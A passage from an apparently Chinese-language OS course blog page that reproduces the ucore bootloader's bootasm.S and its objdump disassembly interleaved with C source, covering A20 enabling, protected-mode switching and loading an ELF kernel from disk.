class="line">    12  # start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br><span class="line">    13  .globl start</span><br><span class="line">    14  start:</span><br><span class="line">    15  .code16                                             # Assemble for 16-bit mode</span><br><span class="line">    16      cli                                             # Disable interrupts</span><br><span class="line">    17      cld                                             # String operations increment</span><br><span class="line">    18</span><br><span class="line">    19      # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">    20      xorw %ax, %ax                                   # Segment number zero</span><br><span class="line">    21      movw %ax, %ds                                   # -&gt; Data Segment</span><br><span class="line">    22      movw %ax, %es                                   # -&gt; Extra Segment</span><br><span class="line">    23      movw %ax, %ss                                   # -&gt; Stack Segment</span><br><span class="line">    24</span><br><span class="line">    25      # Enable A20:</span><br><span class="line">    26      #  For backwards compatibility with the earliest PCs, physical</span><br><span class="line">    27      #  address line 20 is tied low, so that addresses higher than</span><br><span class="line">    28      #  1MB wrap around to zero by default. This code undoes this.</span><br><span class="line">    29  seta20.1:</span><br><span class="line">    30      inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    31      testb $0x2, %al</span><br><span class="line">    32      jnz seta20.1</span><br><span class="line">    33</span><br><span class="line">    34      movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64</span><br><span class="line">    35      outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port</span><br><span class="line">    36</span><br><span class="line">    37  seta20.2:</span><br><span class="line">    38      inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    39      testb $0x2, %al</span><br><span class="line">    40      jnz seta20.2</span><br><span class="line">    41</span><br><span class="line">    42      movb $0xdf, %al                                 # 0xdf -&gt; port 0x60</span><br><span class="line">    43      outb %al, $0x60                                 # 0xdf &#x3D; 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1</span><br><span class="line">    44</span><br><span class="line">    45      # Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line">    46      # and segment translation that makes virtual addresses</span><br><span class="line">    47      # identical to physical addresses, so that the</span><br><span class="line">    48      # effective memory map does not change during the switch.</span><br><span class="line">    49      lgdt gdtdesc</span><br><span class="line">    50      movl %cr0, %eax</span><br><span class="line">    51      orl $CR0_PE_ON, %eax</span><br><span class="line">    52      movl %eax, %cr0</span><br><span class="line">    53</span><br><span class="line">    54      # Jump to next instruction, but in 32-bit code segment.</span><br><span class="line">    55      # Switches processor into 32-bit mode.</span><br><span class="line">    56      ljmp $PROT_MODE_CSEG, $protcseg</span><br><span class="line">    57</span><br><span class="line">    58  .code32                                             # Assemble for 32-bit mode</span><br><span class="line">    59  protcseg:</span><br><span class="line">    60      # Set up the protected-mode data segment registers</span><br><span class="line">    61      movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</span><br><span class="line">    62      movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">    63      movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">    64      movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">    65      movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">    66      movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line">    67</span><br><span class="line">    68      # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">    69      movl $0x0, %ebp</span><br><span class="line">    70      movl $start, %esp</span><br><span class="line">    71      call bootmain</span><br><span class="line">    72</span><br><span class="line">    73      # If bootmain returns (it shouldn&#39;t), loop.</span><br><span class="line">    74  spin:</span><br><span class="line">    75      jmp spin</span><br><span class="line">    76</span><br><span class="line">    77  # Bootstrap GDT</span><br><span class="line">    78  .p2align 2                                          # force 4 byte alignment</span><br><span class="line">    79  gdt:</span><br><span class="line">    80      SEG_NULLASM                                     # null seg</span><br><span class="line">    81      SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel</span><br><span class="line">    82      SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel</span><br><span class="line">    83</span><br><span class="line">    84  gdtdesc:</span><br><span class="line">    85      .word 0x17                                      # sizeof(gdt) - 1</span><br><span class="line">    86      .long gdt                                       # address gdt</span><br></pre></td></tr></table></figure></div>
<h3 id="bootblock-asm的代码"><a href="#bootblock-asm的代码" class="headerlink" title="bootblock.asm的代码"></a>bootblock.asm的代码</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">moocos-&gt; cat .&#x2F;obj&#x2F;bootblock.asm -n</span><br><span class="line">     1</span><br><span class="line">     2  obj&#x2F;bootblock.o:     file format elf32-i386</span><br><span class="line">     3</span><br><span class="line">     4</span><br><span class="line">     5  Disassembly of section .text:</span><br><span class="line">     6</span><br><span class="line">     7  00007c00 &lt;start&gt;:</span><br><span class="line">     8</span><br><span class="line">     9  # start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br><span class="line">    10  .globl start</span><br><span class="line">    11  start:</span><br><span class="line">    12  .code16                                             # Assemble for 16-bit mode</span><br><span class="line">    13      cli                                             # Disable interrupts</span><br><span class="line">    14      7c00:       fa                      cli</span><br><span class="line">    15      cld                                             # String operations increment</span><br><span class="line">    16      7c01:       fc                      cld</span><br><span class="line">    17</span><br><span class="line">    18      # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">    19      xorw %ax, %ax                                   # Segment number zero</span><br><span class="line">    20      7c02:       31 c0                   xor    %eax,%eax</span><br><span class="line">    21      movw %ax, %ds                                   # -&gt; Data Segment</span><br><span class="line">    22      7c04:       8e d8                   mov    %eax,%ds</span><br><span class="line">    23      movw %ax, %es                                   # -&gt; Extra Segment</span><br><span class="line">    24      7c06:       8e c0                   mov    %eax,%es</span><br><span class="line">    25      movw %ax, %ss                                   # -&gt; Stack Segment</span><br><span class="line">    26      7c08:       8e d0                   mov    %eax,%ss</span><br><span class="line">    27</span><br><span class="line">    28  00007c0a &lt;seta20.1&gt;:</span><br><span class="line">    29      # Enable A20:</span><br><span class="line">    30      #  For backwards compatibility with the earliest PCs, physical</span><br><span class="line">    31      #  address line 20 is tied low, so that addresses higher than</span><br><span class="line">    32      #  1MB wrap around to zero by default. This code undoes this.</span><br><span class="line">    33  seta20.1:</span><br><span class="line">    34      inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    35      7c0a:       e4 64                   in     $0x64,%al</span><br><span class="line">    36      testb $0x2, %al</span><br><span class="line">    37      7c0c:       a8 02                   test   $0x2,%al</span><br><span class="line">    38      jnz seta20.1</span><br><span class="line">    39      7c0e:       75 fa                   jne    7c0a &lt;seta20.1&gt;</span><br><span class="line">    40</span><br><span class="line">    41      movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64</span><br><span class="line">    42      7c10:       b0 d1                   mov    $0xd1,%al</span><br><span class="line">    43      outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port</span><br><span class="line">    44      7c12:       e6 64                   out    %al,$0x64</span><br><span class="line">    45</span><br><span class="line">    46  00007c14 &lt;seta20.2&gt;:</span><br><span class="line">    47</span><br><span class="line">    48  seta20.2:</span><br><span class="line">    49      inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    50      7c14:       e4 64                   in     $0x64,%al</span><br><span class="line">    51      testb $0x2, %al</span><br><span class="line">    52      7c16:       a8 02                   test   $0x2,%al</span><br><span class="line">    53      jnz seta20.2</span><br><span class="line">    54      7c18:       75 fa                   jne    7c14 &lt;seta20.2&gt;</span><br><span class="line">    55</span><br><span class="line">    56      movb $0xdf, %al                                 # 0xdf -&gt; port 0x60</span><br><span class="line">    57      7c1a:       b0 df                   mov    $0xdf,%al</span><br><span class="line">    58      outb %al, $0x60                                 # 0xdf &#x3D; 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1</span><br><span class="line">    59      7c1c:       e6 60                   out    %al,$0x60</span><br><span class="line">    60</span><br><span class="line">    61      # Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line">    62      # and segment translation that makes virtual addresses</span><br><span class="line">    63      # identical to physical addresses, so that the</span><br><span class="line">    64      # effective memory map does not change during the switch.</span><br><span class="line">    65      lgdt gdtdesc</span><br><span class="line">    66      7c1e:       0f 01 16                lgdtl  (%esi)</span><br><span class="line">    67      7c21:       6c                      insb   (%dx),%es:(%edi)</span><br><span class="line">    68      7c22:       7c 0f                   jl     7c33 &lt;protcseg+0x1&gt;</span><br><span class="line">    69      movl %cr0, %eax</span><br><span class="line">    70      7c24:       20 c0                   and    %al,%al</span><br><span class="line">    71      orl $CR0_PE_ON, %eax</span><br><span class="line">    72      7c26:       66 83 c8 01             or     $0x1,%ax</span><br><span class="line">    73      movl %eax, %cr0</span><br><span class="line">    74      7c2a:       0f 22 c0                mov    %eax,%cr0</span><br><span class="line">    75</span><br><span class="line">    76      # Jump to next instruction, but in 32-bit code segment.</span><br><span class="line">    77      # Switches processor into 32-bit mode.</span><br><span class="line">    78      ljmp $PROT_MODE_CSEG, $protcseg</span><br><span class="line">    79      7c2d:       ea 32 7c 08 00 66 b8    ljmp   $0xb866,$0x87c32</span><br><span class="line">    80</span><br><span class="line">    81  00007c32 &lt;protcseg&gt;:</span><br><span class="line">    82</span><br><span class="line">    83  .code32                                             # Assemble for 32-bit mode</span><br><span class="line">    84  protcseg:</span><br><span class="line">    85      # Set up the protected-mode data segment registers</span><br><span class="line">    86      movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</span><br><span class="line">    87      7c32:       66 b8 10 00             mov    $0x10,%ax</span><br><span class="line">    88      movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">    89      7c36:       8e d8                   mov    %eax,%ds</span><br><span class="line">    90      movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">    91      7c38:       8e c0                   mov    %eax,%es</span><br><span class="line">    92      movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">    93      7c3a:       8e e0                   mov    %eax,%fs</span><br><span class="line">    94      movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">    95      7c3c:       8e e8                   mov    %eax,%gs</span><br><span class="line">    96      movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line">    97      7c3e:       8e d0                   mov    %eax,%ss</span><br><span class="line">    98</span><br><span class="line">    99      # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">   100      movl $0x0, %ebp</span><br><span class="line">   101      7c40:       bd 00 00 00 00          mov    $0x0,%ebp</span><br><span class="line">   102      movl $start, %esp</span><br><span class="line">   103      7c45:       bc 00 7c 00 00          mov    $0x7c00,%esp</span><br><span class="line">   104      call bootmain</span><br><span class="line">   105      7c4a:       e8 82 00 00 00          call   7cd1 &lt;bootmain&gt;</span><br><span class="line">   106</span><br><span class="line">   107  00007c4f &lt;spin&gt;:</span><br><span class="line">   108</span><br><span class="line">   109      # If bootmain returns (it shouldn&#39;t), loop.</span><br><span class="line">   110  spin:</span><br><span class="line">   111      jmp spin</span><br><span class="line">   112      7c4f:       eb fe                   jmp    7c4f &lt;spin&gt;</span><br><span class="line">   113      7c51:       8d 76 00                lea    0x0(%esi),%esi</span><br><span class="line">   114</span><br><span class="line">   115  00007c54 &lt;gdt&gt;:</span><br><span class="line">   116          ...</span><br><span class="line">   117      7c5c:       ff                      (bad)</span><br><span class="line">   118      7c5d:       ff 00                   incl   (%eax)</span><br><span class="line">   119      7c5f:       00 00                   add    %al,(%eax)</span><br><span class="line">   120      7c61:       9a cf 00 ff ff 00 00    lcall  $0x0,$0xffff00cf</span><br><span class="line">   121      7c68:       00 92 cf 00 17 00       add    %dl,0x1700cf(%edx)</span><br><span class="line">   122</span><br><span class="line">   123  00007c6c &lt;gdtdesc&gt;:</span><br><span class="line">   124      7c6c:       17                      pop    %ss</span><br><span class="line">   125      7c6d:       00 54 7c 00             add    %dl,0x0(%esp,%edi,2)</span><br><span class="line">   126          ...</span><br><span class="line">   127</span><br><span class="line">   128  00007c72 &lt;readsect&gt;:</span><br><span class="line">   129          &#x2F;* do nothing *&#x2F;;</span><br><span class="line">   130  &#125;</span><br><span class="line">   131</span><br><span class="line">   132  &#x2F;* readsect - read a single sector at @secno into @dst *&#x2F;</span><br><span class="line">   133  static void</span><br><span class="line">   134  readsect(void *dst, uint32_t secno) &#123;</span><br><span class="line">   135      7c72:       55                      push   %ebp</span><br><span class="line">   136      7c73:       89 d1                   mov    %edx,%ecx</span><br><span class="line">   137      7c75:       89 e5                   mov    %esp,%ebp</span><br><span class="line">   138  static inline void ltr(uint16_t sel) __attribute__((always_inline));</span><br><span class="line">   139</span><br><span class="line">   140  static inline uint8_t</span><br><span class="line">   141  inb(uint16_t port) &#123;</span><br><span class="line">   142      uint8_t data;</span><br><span class="line">   143      asm volatile (&quot;inb %1, %0&quot; : &quot;&#x3D;a&quot; (data) : &quot;d&quot; (port));</span><br><span class="line">   144      7c77:       ba f7 01 00 00          mov    $0x1f7,%edx</span><br><span class="line">   145      7c7c:       57                      push   %edi</span><br><span class="line">   146      7c7d:       89 c7                   mov    %eax,%edi</span><br><span class="line">   147      7c7f:       ec                      in     (%dx),%al</span><br><span class="line">   148  #define ELFHDR          ((struct elfhdr *)0x10000)      &#x2F;&#x2F; scratch space</span><br><span class="line">   149</span><br><span class="line">   150  &#x2F;* waitdisk - wait for disk ready *&#x2F;</span><br><span class="line">   151  static void</span><br><span class="line">   152  waitdisk(void) &#123;</span><br><span class="line">   153      while ((inb(0x1F7) &amp; 0xC0) !&#x3D; 0x40)</span><br><span class="line">   154      7c80:       83 e0 c0                and    $0xffffffc0,%eax</span><br><span class="line">   155      7c83:       3c 40                   cmp    $0x40,%al</span><br><span class="line">   156      7c85:       75 f8                   jne    7c7f &lt;readsect+0xd&gt;</span><br><span class="line">   157              : &quot;memory&quot;, &quot;cc&quot;);</span><br><span class="line">   158  &#125;</span><br><span class="line">   159</span><br><span class="line">   160  static inline void</span><br><span class="line">   161  outb(uint16_t port, uint8_t data) &#123;</span><br><span class="line">   162      asm volatile (&quot;outb %0, %1&quot; :: &quot;a&quot; (data), &quot;d&quot; (port));</span><br><span class="line">   163      7c87:       ba f2 01 00 00          mov    $0x1f2,%edx</span><br><span class="line">   164      7c8c:       b0 01                   mov    $0x1,%al</span><br><span class="line">   165      7c8e:       ee                      out    %al,(%dx)</span><br><span class="line">   166      7c8f:       0f b6 c1                movzbl %cl,%eax</span><br><span class="line">   167      7c92:       b2 f3                   mov    $0xf3,%dl</span><br><span class="line">   168      7c94:       ee                      out    %al,(%dx)</span><br><span class="line">   169      7c95:       0f b6 c5                movzbl %ch,%eax</span><br><span class="line">   170      7c98:       b2 f4                   mov    $0xf4,%dl</span><br><span class="line">   171      7c9a:       ee                      out    %al,(%dx)</span><br><span class="line">   172      waitdisk();</span><br><span class="line">   173</span><br><span class="line">   174      outb(0x1F2, 1);                         &#x2F;&#x2F; count &#x3D; 1</span><br><span class="line">   175      outb(0x1F3, secno &amp; 0xFF);</span><br><span class="line">   176      outb(0x1F4, (secno &gt;&gt; 8) &amp; 0xFF);</span><br><span class="line">   177      outb(0x1F5, (secno &gt;&gt; 16) &amp; 0xFF);</span><br><span class="line">   178      7c9b:       89 c8                   mov    %ecx,%eax</span><br><span class="line">   179      7c9d:       b2 f5                   mov    $0xf5,%dl</span><br><span class="line">   180      7c9f:       c1 e8 10                shr    $0x10,%eax</span><br><span class="line">   181      7ca2:       0f b6 c0                movzbl %al,%eax</span><br><span class="line">   182      7ca5:       ee                      out    %al,(%dx)</span><br><span class="line">   183      outb(0x1F6, ((secno &gt;&gt; 24) &amp; 0xF) | 0xE0);</span><br><span class="line">   184      7ca6:       c1 e9 18                shr    $0x18,%ecx</span><br><span class="line">   185      7ca9:       b2 f6                   mov    $0xf6,%dl</span><br><span class="line">   186      7cab:       88 c8                   mov    %cl,%al</span><br><span class="line">   187      7cad:       83 e0 0f                and    $0xf,%eax</span><br><span class="line">   188      7cb0:       83 c8 e0                or     $0xffffffe0,%eax</span><br><span class="line">   189      7cb3:       ee                      out    %al,(%dx)</span><br><span class="line">   190      7cb4:       b0 20                   mov    $0x20,%al</span><br><span class="line">   191      7cb6:       b2 f7                   mov    $0xf7,%dl</span><br><span class="line">   192      7cb8:       ee                      out    %al,(%dx)</span><br><span class="line">   193  static inline void ltr(uint16_t sel) __attribute__((always_inline));</span><br><span class="line">   194</span><br><span class="line">   195  static inline uint8_t</span><br><span class="line">   196  inb(uint16_t port) &#123;</span><br><span class="line">   197      uint8_t data;</span><br><span class="line">   198      asm volatile (&quot;inb %1, %0&quot; : &quot;&#x3D;a&quot; (data) : &quot;d&quot; (port));</span><br><span class="line">   199      7cb9:       ec                      in     (%dx),%al</span><br><span class="line">   200  #define ELFHDR          ((struct elfhdr *)0x10000)      &#x2F;&#x2F; scratch space</span><br><span class="line">   201</span><br><span class="line">   202  &#x2F;* waitdisk - wait for disk ready *&#x2F;</span><br><span class="line">   203  static void</span><br><span class="line">   204  waitdisk(void) &#123;</span><br><span class="line">   205      while ((inb(0x1F7) &amp; 0xC0) !&#x3D; 0x40)</span><br><span class="line">   206      7cba:       83 e0 c0                and    $0xffffffc0,%eax</span><br><span class="line">   207      7cbd:       3c 40                   cmp    $0x40,%al</span><br><span class="line">   208      7cbf:       75 f8                   jne    7cb9 &lt;readsect+0x47&gt;</span><br><span class="line">   209      return data;</span><br><span class="line">   210  &#125;</span><br><span class="line">   211</span><br><span class="line">   212  static inline void</span><br><span class="line">   213  insl(uint32_t port, void *addr, int cnt) &#123;</span><br><span class="line">   214      asm volatile (</span><br><span class="line">   215      7cc1:       b9 80 00 00 00          mov    $0x80,%ecx</span><br><span class="line">   216      7cc6:       ba f0 01 00 00          mov    $0x1f0,%edx</span><br><span class="line">   217      7ccb:       fc                      cld</span><br><span class="line">   218      7ccc:       f2 6d                   repnz insl (%dx),%es:(%edi)</span><br><span class="line">   219      &#x2F;&#x2F; wait for disk to be ready</span><br><span class="line">   220      waitdisk();</span><br><span class="line">   221</span><br><span class="line">   222      &#x2F;&#x2F; read a sector</span><br><span class="line">   223      insl(0x1F0, dst, SECTSIZE &#x2F; 4);</span><br><span class="line">   224  &#125;</span><br><span class="line">   225      7cce:       5f                      pop    %edi</span><br><span class="line">   226      7ccf:       5d                      pop    %ebp</span><br><span class="line">   227      7cd0:       c3                      ret</span><br><span class="line">   228</span><br><span class="line">   229  00007cd1 &lt;bootmain&gt;:</span><br><span class="line">   230      &#125;</span><br><span class="line">   231  &#125;</span><br><span class="line">   232</span><br><span class="line">   233  &#x2F;* bootmain - the entry of bootloader *&#x2F;</span><br><span class="line">   234  void</span><br><span class="line">   235  bootmain(void) &#123;</span><br><span class="line">   236      7cd1:       55                      push   %ebp</span><br><span class="line">   237      7cd2:       89 e5                   mov    %esp,%ebp</span><br><span class="line">   238      7cd4:       57                      push   %edi</span><br><span class="line">   239      7cd5:       56                      push   %esi</span><br><span class="line">   240      7cd6:       53                      push   %ebx</span><br><span class="line">   241</span><br><span class="line">   242      &#x2F;&#x2F; round down to sector boundary</span><br><span class="line">   243      va -&#x3D; offset % SECTSIZE;</span><br><span class="line">   244</span><br><span class="line">   245      &#x2F;&#x2F; translate from bytes to sectors; kernel starts at sector 1</span><br><span class="line">   246      uint32_t secno &#x3D; (offset &#x2F; SECTSIZE) + 1;</span><br><span class="line">   247      7cd7:       bb 01 00 00 00          mov    $0x1,%ebx</span><br><span class="line">   248      &#125;</span><br><span class="line">   249  &#125;</span><br><span class="line">   250</span><br><span class="line">   251  &#x2F;* bootmain - the entry of bootloader *&#x2F;</span><br><span class="line">   252  void</span><br><span class="line">   253  bootmain(void) &#123;</span><br><span class="line">   254      7cdc:       83 ec 1c                sub    $0x1c,%esp</span><br><span class="line">   255      7cdf:       8d 43 7f                lea    0x7f(%ebx),%eax</span><br><span class="line">   256</span><br><span class="line">   257      &#x2F;&#x2F; If this is too slow, we could read lots of sectors at a time.</span><br><span class="line">   258      &#x2F;&#x2F; We&#39;d write more to memory than asked, but it doesn&#39;t matter --</span><br><span class="line">   259      &#x2F;&#x2F; we load in increasing order.</span><br><span class="line">   260      for (; va &lt; end_va; va +&#x3D; SECTSIZE, secno ++) &#123;</span><br><span class="line">   261          readsect((void *)va, secno);</span><br><span class="line">   262      7ce2:       89 da                   mov    %ebx,%edx</span><br><span class="line">   263      7ce4:       c1 e0 09                shl    $0x9,%eax</span><br><span class="line">   264      uint32_t secno &#x3D; (offset &#x2F; SECTSIZE) + 1;</span><br><span class="line">   265</span><br><span class="line">   266      &#x2F;&#x2F; If this is too slow, we could read lots of sectors at a time.</span><br><span class="line">   267      &#x2F;&#x2F; We&#39;d write more to memory than asked, but it doesn&#39;t matter --</span><br><span class="line">   268      &#x2F;&#x2F; we load in increasing order.</span><br><span class="line">   269      for (; va &lt; end_va; va +&#x3D; SECTSIZE, secno ++) &#123;</span><br><span class="line">   270      7ce7:       43                      inc    %ebx</span><br><span class="line">   271          readsect((void *)va, secno);</span><br><span class="line">   272      7ce8:       e8 85 ff ff ff          call   7c72 &lt;readsect&gt;</span><br><span class="line">   273      uint32_t secno &#x3D; (offset &#x2F; SECTSIZE) + 1;</span><br><span class="line">   274</span><br><span class="line">   275      &#x2F;&#x2F; If this is too slow, we could read lots of sectors at a time.</span><br><span class="line">   276      &#x2F;&#x2F; We&#39;d write more to memory than asked, but it doesn&#39;t matter --</span><br><span class="line">   277      &#x2F;&#x2F; we load in increasing order.</span><br><span class="line">   278      for (; va &lt; end_va; va +&#x3D; SECTSIZE, secno ++) &#123;</span><br><span class="line">   279      7ced:       83 fb 09                cmp    $0x9,%ebx</span><br><span class="line">   280      7cf0:       75 ed                   jne    7cdf &lt;bootmain+0xe&gt;</span><br><span class="line">   281  bootmain(void) &#123;</span><br><span class="line">   282      &#x2F;&#x2F; read the 1st page off disk</span><br><span class="line">   283      readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0);</span><br><span class="line">   284</span><br><span class="line">   285      &#x2F;&#x2F; is this a valid ELF?</span><br><span class="line">   286      if (ELFHDR-&gt;e_magic !&#x3D; ELF_MAGIC) &#123;</span><br><span class="line">   287      7cf2:       81 3d 00 00 01 00 7f    cmpl   $0x464c457f,0x10000</span><br><span class="line">   288      7cf9:       45 4c 46</span><br><span class="line">   289      7cfc:       75 6a                   jne    7d68 &lt;bootmain+0x97&gt;</span><br><span class="line">   290      &#125;</span><br><span class="line">   291</span><br><span class="line">   292      struct proghdr *ph, *eph;</span><br><span class="line">   293</span><br><span class="line">   294      &#x2F;&#x2F; load each program segment (ignores ph flags)</span><br><span class="line">   295      ph &#x3D; (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">   296      7cfe:       a1 1c 00 01 00          mov    0x1001c,%eax</span><br><span class="line">   297      7d03:       8d 98 00 00 01 00       lea    0x10000(%eax),%ebx</span><br><span class="line">   298      eph &#x3D; ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">   299      7d09:       0f b7 05 2c 00 01 00    movzwl 0x1002c,%eax</span><br><span class="line">   300      7d10:       c1 e0 05                shl    $0x5,%eax</span><br><span class="line">   301      7d13:       01 d8                   add    %ebx,%eax</span><br><span class="line">   302      7d15:       89 45 e4                mov    %eax,-0x1c(%ebp)</span><br><span class="line">   303      for (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">   304      7d18:       3b 5d e4                cmp    -0x1c(%ebp),%ebx</span><br><span class="line">   305      7d1b:       73 3f                   jae    7d5c &lt;bootmain+0x8b&gt;</span><br><span class="line">   306          readseg(ph-&gt;p_va &amp; 0xFFFFFF, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">   307      7d1d:       8b 73 08                mov    0x8(%ebx),%esi</span><br><span class="line">   308   * readseg - read @count bytes at @offset from kernel into virtual address @va,</span><br><span class="line">   309   * might copy more than asked.</span><br><span class="line">   310   * *&#x2F;</span><br><span class="line">   311  static void</span><br><span class="line">   312  readseg(uintptr_t va, uint32_t count, uint32_t offset) &#123;</span><br><span class="line">   313      uintptr_t end_va &#x3D; va + count;</span><br><span class="line">   314      7d20:       8b 43 14                mov    0x14(%ebx),%eax</span><br><span class="line">   315</span><br><span class="line">   316      &#x2F;&#x2F; load each program segment (ignores ph flags)</span><br><span class="line">   317      ph &#x3D; (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">   318      eph &#x3D; ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">   319      for (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">   320          readseg(ph-&gt;p_va &amp; 0xFFFFFF, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">   321      7d23:       8b 4b 04                mov    0x4(%ebx),%ecx</span><br><span class="line">   322      7d26:       81 e6 ff ff ff 00       and    $0xffffff,%esi</span><br><span class="line">   323   * readseg - read @count bytes at @offset from kernel into virtual address @va,</span><br><span class="line">   324   * might copy more than asked.</span><br><span class="line">   325   * *&#x2F;</span><br><span class="line">   326  static void</span><br><span class="line">   327  readseg(uintptr_t va, uint32_t count, uint32_t offset) &#123;</span><br><span class="line">   328      uintptr_t end_va &#x3D; va + count;</span><br><span class="line">   329      7d2c:       01 f0                   add    %esi,%eax</span><br><span class="line">   330      7d2e:       89 45 e0                mov    %eax,-0x20(%ebp)</span><br><span class="line">   331</span><br><span class="line">   332      &#x2F;&#x2F; round down to sector boundary</span><br><span class="line">   333      va -&#x3D; offset % SECTSIZE;</span><br><span class="line">   334      7d31:       89 c8                   mov    %ecx,%eax</span><br><span class="line">   335      7d33:       25 ff 01 00 00          and    $0x1ff,%eax</span><br><span class="line">   336</span><br><span class="line">   337      &#x2F;&#x2F; translate from bytes to sectors; kernel starts at sector 1</span><br><span class="line">   338      uint32_t secno &#x3D; (offset &#x2F; SECTSIZE) + 1;</span><br><span class="line">   339      7d38:       c1 e9 09                shr    $0x9,%ecx</span><br><span class="line">   340  static void</span><br><span class="line">   341  readseg(uintptr_t va, uint32_t count, uint32_t offset) &#123;</span><br><span class="line">   342      uintptr_t end_va &#x3D; va + count;</span><br><span class="line">   343</span><br><span class="line">   344      &#x2F;&#x2F; round down to sector boundary</span><br><span class="line">   345      va -&#x3D; offset % SECTSIZE;</span><br><span class="line">   346      7d3b:       29 c6                   sub    %eax,%esi</span><br><span class="line">   347</span><br><span class="line">   348      &#x2F;&#x2F; translate from bytes to sectors; kernel starts at sector 1</span><br><span class="line">   349      uint32_t secno &#x3D; (offset &#x2F; SECTSIZE) + 1;</span><br><span class="line">   350      7d3d:       8d 79 01                lea    0x1(%ecx),%edi</span><br><span class="line">   351</span><br><span class="line">   352      &#x2F;&#x2F; If this is too slow, we could read lots of sectors at a time.</span><br><span class="line">   353      &#x2F;&#x2F; We&#39;d write more to memory than asked, but it doesn&#39;t matter --</span><br><span class="line">   354      &#x2F;&#x2F; we load in increasing order.</span><br><span class="line">   355      for (; va &lt; end_va; va +&#x3D; SECTSIZE, secno ++) &#123;</span><br><span class="line">   356      7d40:       3b 75 e0                cmp    -0x20(%ebp),%esi</span><br><span class="line">   357      7d43:       73 12                   jae    7d57 &lt;bootmain+0x86&gt;</span><br><span class="line">   358          readsect((void *)va, secno);</span><br><span class="line">   359      7d45:       89 fa                   mov    %edi,%edx</span><br><span class="line">   360      7d47:       89 f0                   mov    %esi,%eax</span><br><span class="line">   361      7d49:       e8 24 ff ff ff          call   7c72 &lt;readsect&gt;</span><br><span class="line">   362      uint32_t secno &#x3D; (offset &#x2F; SECTSIZE) + 1;</span><br><span class="line">   363</span><br><span class="line">   364      &#x2F;&#x2F; If this is too slow, we could read lots of sectors at a time.</span><br><span class="line">   365      &#x2F;&#x2F; We&#39;d write more to memory than asked, but it doesn&#39;t matter --</span><br><span class="line">   366      &#x2F;&#x2F; we load in increasing order.</span><br><span class="line">   367      for (; va &lt; end_va; va +&#x3D; SECTSIZE, secno ++) &#123;</span><br><span class="line">   368      7d4e:       81 c6 00 02 00 00       add    $0x200,%esi</span><br><span class="line">   369      7d54:       47                      inc    %edi</span><br><span class="line">   370      7d55:       eb e9                   jmp    7d40 &lt;bootmain+0x6f&gt;</span><br><span class="line">   371      struct proghdr *ph, *eph;</span><br><span class="line">   372</span><br><span class="line">   373      &#x2F;&#x2F; load each program segment (ignores ph flags)</span><br><span class="line">   374      ph &#x3D; (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">   375      eph &#x3D; ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">   376      for (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">   377      7d57:       83 c3 20                add    $0x20,%ebx</span><br><span class="line">   378      7d5a:       eb bc                   jmp    7d18 &lt;bootmain+0x47&gt;</span><br><span class="line">   379          readseg(ph-&gt;p_va &amp; 0xFFFFFF, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">   380      &#125;</span><br><span class="line">   381</span><br><span class="line">   382      &#x2F;&#x2F; call the entry point from the ELF header</span><br><span class="line">   383      &#x2F;&#x2F; note: does not return</span><br><span class="line">   384      ((void (*)(void))(ELFHDR-&gt;e_entry &amp; 0xFFFFFF))();</span><br><span class="line">   385      7d5c:       a1 18 00 01 00          mov    0x10018,%eax</span><br><span class="line">   386      7d61:       25 ff ff ff 00          and    $0xffffff,%eax</span><br><span class="line">   387      7d66:       ff d0                   call   *%eax</span><br><span class="line">   388      asm volatile (&quot;outb %0, %1&quot; :: &quot;a&quot; (data), &quot;d&quot; (port));</span><br><span class="line">   389  &#125;</span><br><span class="line">   390</span><br><span class="line">   391  static inline void</span><br><span class="line">   392  outw(uint16_t port, uint16_t 